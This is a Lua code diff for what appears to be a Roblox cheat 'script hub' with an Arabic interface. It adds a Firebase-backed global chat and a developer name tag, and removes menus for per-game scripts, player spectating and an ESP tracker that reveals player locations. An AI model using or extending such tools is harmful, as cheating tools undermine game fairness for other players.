+chatGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+chatGridLayout.Parent = chatGridHolder
+
+for i, url in ipairs(wallUrls) do
+    local cBtn = Instance.new("ImageButton")
+    cBtn.Size = UDim2.new(0, 140, 0, 75)
+    cBtn.BackgroundColor3 = Color3.fromRGB(20, 30, 50)
+    cBtn.Image = url
+    cBtn.ScaleType = Enum.ScaleType.Crop
+    cBtn.ZIndex = 4
+    cBtn.Parent = chatGridHolder
+    Instance.new("UICorner", cBtn).CornerRadius = UDim.new(0, 6)
+
+    cBtn.MouseButton1Click:Connect(function()
+        playUiSound(SOUND_CLICK, 1, 0.35)
+        applyChatBackground(i)
+    end)
+end
+
+ChatFeaturesContainer.CanvasSize = UDim2.new(0, 0, 0, 440)
+
+---------------------------------------------------------
+-- فقاعة الشات فوق رأس مستخدم السكربت
+---------------------------------------------------------
+local function showPrivateScriptUserBubble(userId, text)
+    local targetPlr = Players:GetPlayerByUserId(userId)
+    if not targetPlr or not targetPlr.Character then return end
+    local head = targetPlr.Character:FindFirstChild("Head")
+    if not head then return end
+
+    if head:FindFirstChild("DFXScriptBubble") then head.DFXScriptBubble:Destroy() end
+
+    local bb = Instance.new("BillboardGui")
+    bb.Name = "DFXScriptBubble"
+    bb.Size = UDim2.new(0, 220, 0, 50)
+    bb.StudsOffset = Vector3.new(0, 2.5, 0)
+    bb.AlwaysOnTop = true
+    bb.Parent = head
+
+    local bubbleFrame = Instance.new("Frame")
+    bubbleFrame.Size = UDim2.new(1, 0, 1, 0)
+    bubbleFrame.BackgroundColor3 = Color3.fromRGB(15, 25, 45)
+    bubbleFrame.BackgroundTransparency = 0.15
+    bubbleFrame.Parent = bb
+    Instance.new("UICorner", bubbleFrame).CornerRadius = UDim.new(0, 8)
+
+    local bStroke = Instance.new("UIStroke")
+    bStroke.Color = currentAccentColor
+    bStroke.Thickness = 2
+    bStroke.Parent = bubbleFrame
+
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(1, -10, 1, -10)
+    lbl.Position = UDim2.new(0, 5, 0, 5)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = text
+    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+    lbl.Font = Enum.Font.FredokaOne
+    lbl.TextSize = 13
+    lbl.TextWrapped = true
+    lbl.Parent = bubbleFrame
+
+    task.delay(6, function()
+        if bb and bb.Parent then bb:Destroy() end
+    end)
+end
+
+---------------------------------------------------------
+-- الشات العام
+---------------------------------------------------------
+local ChatScroll = Instance.new("ScrollingFrame")
+ChatScroll.Size = UDim2.new(1, -20, 1, -45)
+ChatScroll.Position = UDim2.new(0, 10, 0, 0)
+ChatScroll.BackgroundTransparency = 1
+ChatScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+ChatScroll.ScrollBarThickness = 3
+ChatScroll.ZIndex = 2
+ChatScroll.Parent = ChatMainContainer
+
+local ChatLayout = Instance.new("UIListLayout")
+ChatLayout.Padding = UDim.new(0, 6)
+ChatLayout.Parent = ChatScroll
+
+local ChatInput = Instance.new("TextBox")
+ChatInput.Size = UDim2.new(1, -115, 0, 30)
+ChatInput.Position = UDim2.new(0, 10, 1, -36)
+ChatInput.BackgroundColor3 = Color3.fromRGB(16, 26, 46)
+ChatInput.PlaceholderText = "اكتب رسالتك هنا..."
+ChatInput.Text = ""
+ChatInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+ChatInput.Font = Enum.Font.FredokaOne
+ChatInput.TextSize = 12
+ChatInput.TextXAlignment = Enum.TextXAlignment.Right
+ChatInput.ZIndex = 2
+ChatInput.Parent = ChatWin
+Instance.new("UICorner", ChatInput).CornerRadius = UDim.new(0, 6)
+
+local SendBtn = Instance.new("TextButton")
+SendBtn.Size = UDim2.new(0, 95, 0, 30)
+SendBtn.Position = UDim2.new(1, -105, 1, -36)
+SendBtn.BackgroundColor3 = currentAccentColor
+SendBtn.Text = "إرسال 🚀"
+SendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+SendBtn.Font = Enum.Font.FredokaOne
+SendBtn.TextSize = 13
+SendBtn.ZIndex = 2
+SendBtn.Parent = ChatWin
+Instance.new("UICorner", SendBtn).CornerRadius = UDim.new(0, 6)
+
+FloatingChatBtn.MouseButton1Click:Connect(function()
+    playUiSound(SOUND_CLICK, 1, 0.35)
+    ChatWin.Visible = not ChatWin.Visible
+end)
+
+local renderedMsgs = {}
+local function addChatMessage(sender, text, userId, msgKey)
+    local msgFrame = Instance.new("Frame")
+    msgFrame.Name = msgKey or "MsgItem"
+    msgFrame.Size = UDim2.new(1, 0, 0, 44)
+    msgFrame.BackgroundColor3 = Color3.fromRGB(16, 26, 46)
+    msgFrame.ZIndex = 2
+    msgFrame.Parent = ChatScroll
+    Instance.new("UICorner", msgFrame).CornerRadius = UDim.new(0, 6)
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = currentAccentColor
+    stroke.Thickness = 1.2
+    stroke.Parent = msgFrame
+    table.insert(registeredOptionStrokes, stroke)
+
+    local rightHeader = Instance.new("Frame")
+    rightHeader.Size = UDim2.new(0, 110, 1, 0)
+    rightHeader.Position = UDim2.new(1, -110, 0, 0)
+    rightHeader.BackgroundTransparency = 1
+    rightHeader.ZIndex = 3
+    rightHeader.Parent = msgFrame
+
+    local avatarImg = Instance.new("ImageLabel")
+    avatarImg.Size = UDim2.new(0, 32, 0, 32)
+    avatarImg.Position = UDim2.new(1, -36, 0.5, -16)
+    avatarImg.BackgroundColor3 = Color3.fromRGB(25, 40, 70)
+    avatarImg.ZIndex = 4
+    avatarImg.Parent = rightHeader
+    Instance.new("UICorner", avatarImg).CornerRadius = UDim.new(0, 16)
+
+    loadAvatarThumbnail(userId or LocalPlayer.UserId, avatarImg)
+
+    local nameLbl = Instance.new("TextLabel")
+    nameLbl.Size = UDim2.new(1, -42, 1, 0)
+    nameLbl.Position = UDim2.new(0, 0, 0, 0)
+    nameLbl.BackgroundTransparency = 1
+    nameLbl.Text = sender .. " :"
+    nameLbl.TextColor3 = currentAccentColor
+    nameLbl.Font = Enum.Font.FredokaOne
+    nameLbl.TextSize = 13
+    nameLbl.TextXAlignment = Enum.TextXAlignment.Right
+    nameLbl.ZIndex = 4
+    nameLbl.Parent = rightHeader
+    table.insert(activeNameLabels, nameLbl)
+
+    local msgTextLbl = Instance.new("TextLabel")
+    msgTextLbl.Size = UDim2.new(1, -120, 1, 0)
+    msgTextLbl.Position = UDim2.new(0, 8, 0, 0)
+    msgTextLbl.BackgroundTransparency = 1
+    msgTextLbl.Text = text
+    msgTextLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+    msgTextLbl.Font = Enum.Font.FredokaOne
+    msgTextLbl.TextSize = 13
+    msgTextLbl.TextXAlignment = Enum.TextXAlignment.Left
+    msgTextLbl.TextWrapped = true
+    msgTextLbl.ZIndex = 4
+    msgTextLbl.Parent = msgFrame
+
+    ChatScroll.CanvasSize = UDim2.new(0, 0, 0, ChatLayout.AbsoluteContentSize.Y + 10)
+    ChatScroll.CanvasPosition = Vector2.new(0, ChatScroll.AbsoluteCanvasSize.Y)
+
+    if userId then
+        showPrivateScriptUserBubble(userId, text)
+    end
+end
+
+local function sendMessageNow()
+    if ChatInput.Text ~= "" then
+        local msg = ChatInput.Text
+        ChatInput.Text = ""
+        pcall(function()
+            customRequest({
+                Url = FIREBASE_CHAT_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({
+                    sender = LocalPlayer.DisplayName ~= "" and LocalPlayer.DisplayName or LocalPlayer.Name,
+                    userId = LocalPlayer.UserId,
+                    text = msg,
+                    time = os.time()
+                })
+            })
+        end)
+    end
+end
+
+SendBtn.MouseButton1Click:Connect(sendMessageNow)
+ChatInput.FocusLost:Connect(function(enter) if enter then sendMessageNow() end end)
+
 task.spawn(function()
-    local INTERVAL = 1800
-    local lastCycle = math.floor(os.time() / INTERVAL)
+    local timer = 300
     while true do
-        local now = os.time()
-        local currentCycle = math.floor(now / INTERVAL)
-        local remaining = INTERVAL - (now % INTERVAL)
-        local mins = math.floor(remaining / 60)
-        local secs = remaining % 60
+        task.wait(1)
+        timer = timer - 1
+        local mins = math.floor(timer / 60)
+        local secs = timer % 60
+        ResetTimerLbl.Text = string.format("⏱️ التصفير التلقائي: %02d:%02d", mins, secs)
 
-        if ChatTimerLbl then
-            ChatTimerLbl.Text = string.format("⏱️ %02d:%02d", mins, secs)
-        end
-
-        if currentCycle ~= lastCycle then
-            lastCycle = currentCycle
-            renderedMsgs = {}
-            for _, child in ipairs(ChatScroll:GetChildren()) do
-                if child:IsA("Frame") then child:Destroy() end
-            end
-            addChatMessage("sys_reset", 0, "النظام", "🔄 تم إعادة تصفير الشات لمرور 30 دقيقة.")
-        end
-
+        local currentTime = os.time()
         pcall(function()
             local res = customRequest({Url = FIREBASE_CHAT_URL, Method = "GET"})
-            if res and res.StatusCode == 200 and res.Body ~= "" then
-                local data = HttpService:JSONDecode(res.Body)
+            if res and res.StatusCode == 200 then
+                local data = safeDecode(res.Body)
                 if data then
-                    for key, msg in pairs(data) do
-                        if msg.time and math.floor(msg.time / INTERVAL) == currentCycle then
-                            addChatMessage(key, msg.userId or 0, msg.sender or "مجهول", msg.text or "")
+                    for k, m in pairs(data) do
+                        if type(m) == "table" and m.time and (currentTime - m.time) >= 300 then
+                            customRequest({Url = FIREBASE_BASE_URL .. "/global_chat/" .. k .. ".json", Method = "DELETE"})
+                            if ChatScroll:FindFirstChild(k) then ChatScroll[k]:Destroy() end
+                            renderedMsgs[k] = nil
                         end
                     end
                 end
             end
         end)
 
-        task.wait(2)
+        if timer <= 0 then
+            timer = 300
+            for _, child in ipairs(ChatScroll:GetChildren()) do
+                if not child:IsA("UIListLayout") then child:Destroy() end
+            end
+            renderedMsgs = {}
+        end
     end
 end)
 
 ---------------------------------------------------------
--- القائمة الجانبية (Sidebar)
+-- تاج المطور Dms921
 ---------------------------------------------------------
-local Sidebar = Instance.new("Frame")
-Sidebar.Size = UDim2.new(0, 140, 1, 0)
-Sidebar.BackgroundColor3 = Color3.fromRGB(11, 11, 16)
-Sidebar.ZIndex = 3
-Sidebar.Parent = Main
-Instance.new("UICorner", Sidebar).CornerRadius = UDim.new(0, 10)
+local function applyDeveloperTag(plr)
+    if plr.Name ~= "Dms921" then return end
+    if not plr.Character then return end
+    local head = plr.Character:WaitForChild("Head", 5)
+    if not head then return end
 
-local LogoImage = Instance.new("ImageLabel")
-LogoImage.Size = UDim2.new(0, 95, 0, 45)
-LogoImage.Position = UDim2.new(0.5, -47, 0, 6)
-LogoImage.BackgroundTransparency = 1
-LogoImage.Image = logoAsset
-LogoImage.ScaleType = Enum.ScaleType.Fit
-LogoImage.ZIndex = 4
-LogoImage.Parent = Sidebar
+    if head:FindFirstChild("DFXDevTag") then head.DFXDevTag:Destroy() end
 
-local ButtonsHolder = Instance.new("Frame")
-ButtonsHolder.Size = UDim2.new(1, -12, 0, 150)
-ButtonsHolder.Position = UDim2.new(0, 6, 0, 55)
-ButtonsHolder.BackgroundTransparency = 1
-ButtonsHolder.ZIndex = 4
-ButtonsHolder.Parent = Sidebar
+    local bb = Instance.new("BillboardGui")
+    bb.Name = "DFXDevTag"
+    bb.Size = UDim2.new(0, 260, 0, 65)
+    bb.StudsOffset = Vector3.new(0, 3.2, 0)
+    bb.AlwaysOnTop = true
+    bb.Parent = head
 
-local ButtonsLayout = Instance.new("UIListLayout")
-ButtonsLayout.SortOrder = Enum.SortOrder.LayoutOrder
-ButtonsLayout.Padding = UDim.new(0, 5)
-ButtonsLayout.Parent = ButtonsHolder
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(1, 0, 1, 0)
+    lbl.BackgroundTransparency = 1
+    lbl.Font = Enum.Font.FredokaOne
+    lbl.TextSize = 22
+    lbl.Text = "👑 المطور طحبح 👑"
+    lbl.TextColor3 = Color3.fromRGB(255, 215, 0)
+    lbl.Parent = bb
 
-local PlayerCard = Instance.new("Frame")
-PlayerCard.Size = UDim2.new(1, -12, 0, 54)
-PlayerCard.Position = UDim2.new(0, 6, 1, -60)
-PlayerCard.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
-PlayerCard.ZIndex = 4
-PlayerCard.Parent = Sidebar
-Instance.new("UICorner", PlayerCard).CornerRadius = UDim.new(0, 8)
+    local textStroke = Instance.new("UIStroke")
+    textStroke.Color = Color3.fromRGB(0, 0, 0)
+    textStroke.Thickness = 3
+    textStroke.Parent = lbl
 
-local CardStroke = Instance.new("UIStroke")
-CardStroke.Color = Color3.fromRGB(255, 215, 0)
-CardStroke.Thickness = 1
-CardStroke.Transparency = 0.5
-CardStroke.Parent = PlayerCard
-
-local PlayerAvatar = Instance.new("ImageLabel")
-PlayerAvatar.Size = UDim2.new(0, 42, 0, 42)
-PlayerAvatar.Position = UDim2.new(0, 6, 0.5, -21)
-PlayerAvatar.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-PlayerAvatar.Image = "rbxthumb://type=AvatarHeadShot&id=" .. LocalPlayer.UserId .. "&w=150&h=150"
-PlayerAvatar.ZIndex = 5
-PlayerAvatar.Parent = PlayerCard
-Instance.new("UICorner", PlayerAvatar).CornerRadius = UDim.new(1, 0)
-
-local PlayerNameLbl = Instance.new("TextLabel")
-PlayerNameLbl.Size = UDim2.new(1, -54, 1, 0)
-PlayerNameLbl.Position = UDim2.new(0, 52, 0, 0)
-PlayerNameLbl.BackgroundTransparency = 1
-PlayerNameLbl.Text = LocalPlayer.DisplayName ~= "" and LocalPlayer.DisplayName or LocalPlayer.Name
-PlayerNameLbl.TextColor3 = Color3.fromRGB(255, 215, 0)
-PlayerNameLbl.Font = Enum.Font.SourceSansBold
-PlayerNameLbl.TextSize = 13
-PlayerNameLbl.TextTruncate = Enum.TextTruncate.AtEnd
-PlayerNameLbl.TextXAlignment = Enum.TextXAlignment.Left
-PlayerNameLbl.ZIndex = 5
-PlayerNameLbl.Parent = PlayerCard
-
----------------------------------------------------------
--- التبويبات
----------------------------------------------------------
-local PagesHolder = Instance.new("Frame")
-PagesHolder.Size = UDim2.new(1, -150, 1, -12)
-PagesHolder.Position = UDim2.new(0, 145, 0, 6)
-PagesHolder.BackgroundTransparency = 1
-PagesHolder.ZIndex = 3
-PagesHolder.Parent = Main
-
-local HomeTab = Instance.new("Frame")
-HomeTab.Size = UDim2.new(1, 0, 1, 0)
-HomeTab.BackgroundTransparency = 1
-HomeTab.Visible = true
-HomeTab.Parent = PagesHolder
-
-local MapScriptsTab = Instance.new("Frame")
-MapScriptsTab.Size = UDim2.new(1, 0, 1, 0)
-MapScriptsTab.BackgroundTransparency = 1
-MapScriptsTab.Visible = false
-MapScriptsTab.Parent = PagesHolder
-
-local SuggestTab = Instance.new("Frame")
-SuggestTab.Size = UDim2.new(1, 0, 1, 0)
-SuggestTab.BackgroundTransparency = 1
-SuggestTab.Visible = false
-SuggestTab.Parent = PagesHolder
-
-local SettingsTab = Instance.new("Frame")
-SettingsTab.Size = UDim2.new(1, 0, 1, 0)
-SettingsTab.BackgroundTransparency = 1
-SettingsTab.Visible = false
-SettingsTab.Parent = PagesHolder
-
-local tabButtons = {}
-local function createTabButton(text, iconId, targetTab)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(1, 0, 0, 30)
-    btn.BackgroundColor3 = (targetTab == HomeTab) and Color3.fromRGB(180, 25, 35) or Color3.fromRGB(22, 22, 28)
-    btn.Text = iconId .. "  " .. text
-    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    btn.Font = Enum.Font.SourceSansBold
-    btn.TextSize = 11.5
-    btn.ZIndex = 4
-    btn.Parent = ButtonsHolder
-
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
-    table.insert(tabButtons, {button = btn, tab = targetTab})
-
-    btn.MouseButton1Click:Connect(function()
-        for _, t in ipairs(tabButtons) do
-            t.button.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
-            if t.tab then t.tab.Visible = false end
+    task.spawn(function()
+        while lbl and lbl.Parent do
+            for i = 0, 1, 0.015 do
+                if not lbl or not lbl.Parent then break end
+                lbl.TextColor3 = Color3.fromHSV(i, 1, 1)
+                task.wait(0.04)
+            end
         end
-        btn.BackgroundColor3 = Color3.fromRGB(180, 25, 35)
-        if targetTab then targetTab.Visible = true end
     end)
+end
+
+for _, p in ipairs(Players:GetPlayers()) do
+    if p.Character then applyDeveloperTag(p) end
+    p.CharacterAdded:Connect(function() task.wait(1); applyDeveloperTag(p) end)
+end
+Players.PlayerAdded:Connect(function(p)
+    p.CharacterAdded:Connect(function() task.wait(1); applyDeveloperTag(p) end)
+end)
+
+---------------------------------------------------------
+-- القوائم الأساسية وأزرار الواجهة
+---------------------------------------------------------
+local function createProStyleBtn(text, side)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, 0, 0, 36)
+    btn.BackgroundColor3 = Color3.fromRGB(16, 26, 46)
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.Font = Enum.Font.FredokaOne
+    btn.TextSize = 16
+    btn.Parent = (side == "left") and LeftWing or RightWing
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = currentAccentColor
+    stroke.Thickness = 1.8
+    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    stroke.Parent = btn
+
+    table.insert(registeredWingStrokes, stroke)
     return btn
 end
 
-createTabButton("الرئيسية", "🏠", HomeTab)
-createTabButton("سكربتات مابات", "🗺️", MapScriptsTab)
-createTabButton("اقتراحات", "💡", SuggestTab)
-createTabButton("الإعدادات", "⚙️", SettingsTab)
-
----------------------------------------------------------
--- 1. الرئيسية
----------------------------------------------------------
-local ServerStatus = Instance.new("TextLabel")
-ServerStatus.Size = UDim2.new(1, -10, 0, 18)
-ServerStatus.BackgroundTransparency = 1
-ServerStatus.Text = "🟢 أونلاين: " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers .. " لاعبين"
-ServerStatus.TextColor3 = Color3.fromRGB(120, 255, 120)
-ServerStatus.Font = Enum.Font.SourceSansBold
-ServerStatus.TextSize = 10.5
-ServerStatus.TextXAlignment = Enum.TextXAlignment.Right
-ServerStatus.Parent = HomeTab
-
-local BannerFrame = Instance.new("Frame")
-BannerFrame.Size = UDim2.new(1, -10, 0, 80)
-BannerFrame.Position = UDim2.new(0, 0, 0, 20)
-BannerFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
-BannerFrame.Parent = HomeTab
-Instance.new("UICorner", BannerFrame).CornerRadius = UDim.new(0, 8)
-
-local BannerImage = Instance.new("ImageLabel")
-BannerImage.Size = UDim2.new(1, 0, 1, 0)
-BannerImage.Image = bannerAsset
-BannerImage.ScaleType = Enum.ScaleType.Crop
-BannerImage.Parent = BannerFrame
-Instance.new("UICorner", BannerImage).CornerRadius = UDim.new(0, 8)
-
-local CardsRow = Instance.new("Frame")
-CardsRow.Size = UDim2.new(1, -10, 0, 34)
-CardsRow.Position = UDim2.new(0, 0, 0, 106)
-CardsRow.BackgroundTransparency = 1
-CardsRow.Parent = HomeTab
-
-local UsersCard = Instance.new("Frame")
-UsersCard.Size = UDim2.new(0.32, 0, 1, 0)
-UsersCard.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
-UsersCard.Parent = CardsRow
-Instance.new("UICorner", UsersCard).CornerRadius = UDim.new(0, 6)
-
-local UsersLbl = Instance.new("TextLabel")
-UsersLbl.Size = UDim2.new(1, 0, 1, 0)
-UsersLbl.BackgroundTransparency = 1
-UsersLbl.Text = "⚡ 67 مستخدم\nنشط الآن"
-UsersLbl.TextColor3 = Color3.fromRGB(255, 215, 0)
-UsersLbl.Font = Enum.Font.SourceSansBold
-UsersLbl.TextSize = 9
-UsersLbl.Parent = UsersCard
-
-local DiscordBtn = Instance.new("TextButton")
-DiscordBtn.Size = UDim2.new(0.33, 0, 1, 0)
-DiscordBtn.Position = UDim2.new(0.335, 0, 0, 0)
-DiscordBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
-DiscordBtn.Text = "💬 ديـسـكـورد"
-DiscordBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-DiscordBtn.Font = Enum.Font.SourceSansBold
-DiscordBtn.TextSize = 11
-DiscordBtn.Parent = CardsRow
-Instance.new("UICorner", DiscordBtn).CornerRadius = UDim.new(0, 6)
-
-DiscordBtn.MouseButton1Click:Connect(function()
-    if setclipboard then
-        setclipboard("https://discord.gg/benhub")
-        DiscordBtn.Text = "✅ تم النسخ!"
-        task.wait(1.5)
-        DiscordBtn.Text = "💬 ديـسـكـورد"
-    end
-end)
-
-local UptimeCard = Instance.new("Frame")
-UptimeCard.Size = UDim2.new(0.32, 0, 1, 0)
-UptimeCard.Position = UDim2.new(0.68, 0, 0, 0)
-UptimeCard.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
-UptimeCard.Parent = CardsRow
-Instance.new("UICorner", UptimeCard).CornerRadius = UDim.new(0, 6)
-
-local UptimeLbl = Instance.new("TextLabel")
-UptimeLbl.Size = UDim2.new(1, 0, 1, 0)
-UptimeLbl.BackgroundTransparency = 1
-UptimeLbl.Text = "⏱️ 00:00\nالوقت المنقضي"
-UptimeLbl.TextColor3 = Color3.fromRGB(220, 220, 230)
-UptimeLbl.Font = Enum.Font.SourceSansBold
-UptimeLbl.TextSize = 9
-UptimeLbl.Parent = UptimeCard
-
-local startTick = tick()
-task.spawn(function()
-    while HomeTab and HomeTab.Parent do
-        local elapsed = math.floor(tick() - startTick)
-        local mins = math.floor(elapsed / 60)
-        local secs = elapsed % 60
-        UptimeLbl.Text = string.format("⏱️ %02d:%02d\nالوقت المنقضي", mins, secs)
-        task.wait(1)
-    end
-end)
-
-local UpdatesBox = Instance.new("Frame")
-UpdatesBox.Size = UDim2.new(1, -10, 0, 125)
-UpdatesBox.Position = UDim2.new(0, 0, 0, 146)
-UpdatesBox.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
-UpdatesBox.Parent = HomeTab
-Instance.new("UICorner", UpdatesBox).CornerRadius = UDim.new(0, 8)
-
-local UpdatesTitle = Instance.new("TextLabel")
-UpdatesTitle.Size = UDim2.new(1, -10, 0, 20)
-UpdatesTitle.Position = UDim2.new(0, 5, 0, 3)
-UpdatesTitle.BackgroundTransparency = 1
-UpdatesTitle.Text = "📢 آخر التحديثات الشاملة:"
-UpdatesTitle.TextColor3 = Color3.fromRGB(255, 215, 0)
-UpdatesTitle.Font = Enum.Font.SourceSansBold
-UpdatesTitle.TextSize = 10.5
-UpdatesTitle.TextXAlignment = Enum.TextXAlignment.Right
-UpdatesTitle.Parent = UpdatesBox
-
-local UpdatesText = Instance.new("TextLabel")
-UpdatesText.Size = UDim2.new(1, -14, 0, 95)
-UpdatesText.Position = UDim2.new(0, 7, 0, 24)
-UpdatesText.BackgroundTransparency = 1
-UpdatesText.Text = "• إضافة وتحديث مابات (99 ليلة، كسر البيض، كيبورد، ركوب حيوانات، سرقة البيض وبلوكس فروت).\n• دمج أحدث السكربتات القوية لكل ماب وتحديث ميزات التتبع والشات."
-UpdatesText.TextColor3 = Color3.fromRGB(200, 200, 210)
-UpdatesText.Font = Enum.Font.SourceSans
-UpdatesText.TextSize = 9.5
-UpdatesText.TextXAlignment = Enum.TextXAlignment.Right
-UpdatesText.TextYAlignment = Enum.TextYAlignment.Top
-UpdatesText.Parent = UpdatesBox
-
----------------------------------------------------------
--- 2. الإعدادات + نظام المراقبة + كشف وتتبع الأماكن (ESP Tracker)
----------------------------------------------------------
-local ChangeServerBtn = Instance.new("TextButton")
-ChangeServerBtn.Size = UDim2.new(1, -20, 0, 28)
-ChangeServerBtn.Position = UDim2.new(0, 0, 0, 8)
-ChangeServerBtn.BackgroundColor3 = Color3.fromRGB(180, 30, 40)
-ChangeServerBtn.Text = "🔄 تغيير السيرفر (Rejoin)"
-ChangeServerBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-ChangeServerBtn.Font = Enum.Font.SourceSansBold
-ChangeServerBtn.TextSize = 10.5
-ChangeServerBtn.Parent = SettingsTab
-Instance.new("UICorner", ChangeServerBtn).CornerRadius = UDim.new(0, 5)
-
-ChangeServerBtn.MouseButton1Click:Connect(function() TeleportService:Teleport(game.PlaceId, LocalPlayer) end)
-
-local ToggleParticlesBtn = Instance.new("TextButton")
-ToggleParticlesBtn.Size = UDim2.new(1, -20, 0, 28)
-ToggleParticlesBtn.Position = UDim2.new(0, 0, 0, 40)
-ToggleParticlesBtn.BackgroundColor3 = particlesEnabled and Color3.fromRGB(40, 130, 60) or Color3.fromRGB(130, 40, 40)
-ToggleParticlesBtn.Text = particlesEnabled and "✨ تأثيرات البارتكلز: مفعلة" or "❌ تأثيرات البارتكلز: معطلة"
-ToggleParticlesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-ToggleParticlesBtn.Font = Enum.Font.SourceSansBold
-ToggleParticlesBtn.TextSize = 10.5
-ToggleParticlesBtn.Parent = SettingsTab
-Instance.new("UICorner", ToggleParticlesBtn).CornerRadius = UDim.new(0, 5)
-
-ToggleParticlesBtn.MouseButton1Click:Connect(function()
-    particlesEnabled = not particlesEnabled
-    if particlesEnabled then
-        ToggleParticlesBtn.Text = "✨ تأثيرات البارتكلز: مفعلة"
-        ToggleParticlesBtn.BackgroundColor3 = Color3.fromRGB(40, 130, 60)
-        spawnParticles()
-    else
-        ToggleParticlesBtn.Text = "❌ تأثيرات البارتكلز: معطلة"
-        ToggleParticlesBtn.BackgroundColor3 = Color3.fromRGB(130, 40, 40)
-        clearParticles()
-    end
-end)
-
-local SpecModalBtn = Instance.new("TextButton")
-SpecModalBtn.Size = UDim2.new(1, -20, 0, 28)
-SpecModalBtn.Position = UDim2.new(0, 0, 0, 72)
-SpecModalBtn.BackgroundColor3 = Color3.fromRGB(30, 100, 180)
-SpecModalBtn.Text = "👁️ مراقبة لاعب (Spectate)"
-SpecModalBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-SpecModalBtn.Font = Enum.Font.SourceSansBold
-SpecModalBtn.TextSize = 10.5
-SpecModalBtn.Parent = SettingsTab
-Instance.new("UICorner", SpecModalBtn).CornerRadius = UDim.new(0, 5)
-
-local TrackerModalBtn = Instance.new("TextButton")
-TrackerModalBtn.Size = UDim2.new(1, -20, 0, 28)
-TrackerModalBtn.Position = UDim2.new(0, 0, 0, 104)
-TrackerModalBtn.BackgroundColor3 = Color3.fromRGB(180, 110, 30)
-TrackerModalBtn.Text = "📍 كشف مكان لاعب (ESP Tracker)"
-TrackerModalBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-TrackerModalBtn.Font = Enum.Font.SourceSansBold
-TrackerModalBtn.TextSize = 10.5
-TrackerModalBtn.Parent = SettingsTab
-Instance.new("UICorner", TrackerModalBtn).CornerRadius = UDim.new(0, 5)
-
-local SaveSettingsBtn = Instance.new("TextButton")
-SaveSettingsBtn.Size = UDim2.new(1, -20, 0, 28)
-SaveSettingsBtn.Position = UDim2.new(0, 0, 0, 136)
-SaveSettingsBtn.BackgroundColor3 = Color3.fromRGB(40, 140, 60)
-SaveSettingsBtn.Text = "💾 حفظ الإعدادات"
-SaveSettingsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-SaveSettingsBtn.Font = Enum.Font.SourceSansBold
-SaveSettingsBtn.TextSize = 10.5
-SaveSettingsBtn.Parent = SettingsTab
-Instance.new("UICorner", SaveSettingsBtn).CornerRadius = UDim.new(0, 5)
-
-SaveSettingsBtn.MouseButton1Click:Connect(function()
-    if writefile then writefile(configFile, HttpService:JSONEncode({particles = particlesEnabled})) end
-    SaveSettingsBtn.Text = "✅ تم الحفظ بنجاح!"
-    task.wait(1.5)
-    SaveSettingsBtn.Text = "💾 حفظ الإعدادات"
-end)
-
----------------------------------------------------------
--- نافذة المراقبة (Spectate Frame)
----------------------------------------------------------
-local SpecFrame = Instance.new("Frame")
-SpecFrame.Size = UDim2.new(1, 0, 1, 0)
-SpecFrame.BackgroundColor3 = Color3.fromRGB(16, 16, 24)
-SpecFrame.Visible = false
-SpecFrame.ZIndex = 20
-SpecFrame.Parent = SettingsTab
-
-local SpecHeader = Instance.new("Frame")
-SpecHeader.Size = UDim2.new(1, 0, 0, 32)
-SpecHeader.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
-SpecHeader.ZIndex = 21
-SpecHeader.Parent = SpecFrame
-
-local SpecTitle = Instance.new("TextLabel")
-SpecTitle.Size = UDim2.new(1, -70, 1, 0)
-SpecTitle.Position = UDim2.new(0, 10, 0, 0)
-SpecTitle.BackgroundTransparency = 1
-SpecTitle.Text = "👁️ اختر لاعباً لمراقبته في السيرفر:"
-SpecTitle.TextColor3 = Color3.fromRGB(255, 215, 0)
-SpecTitle.Font = Enum.Font.SourceSansBold
-SpecTitle.TextSize = 11.5
-SpecTitle.TextXAlignment = Enum.TextXAlignment.Left
-SpecTitle.ZIndex = 22
-SpecTitle.Parent = SpecHeader
-
-local CloseSpecBtn = Instance.new("TextButton")
-CloseSpecBtn.Size = UDim2.new(0, 50, 0, 22)
-CloseSpecBtn.Position = UDim2.new(1, -55, 0, 5)
-CloseSpecBtn.BackgroundColor3 = Color3.fromRGB(180, 30, 40)
-CloseSpecBtn.Text = "إغلاق"
-CloseSpecBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-CloseSpecBtn.Font = Enum.Font.SourceSansBold
-CloseSpecBtn.TextSize = 10
-CloseSpecBtn.ZIndex = 22
-CloseSpecBtn.Parent = SpecHeader
-Instance.new("UICorner", CloseSpecBtn).CornerRadius = UDim.new(0, 4)
-
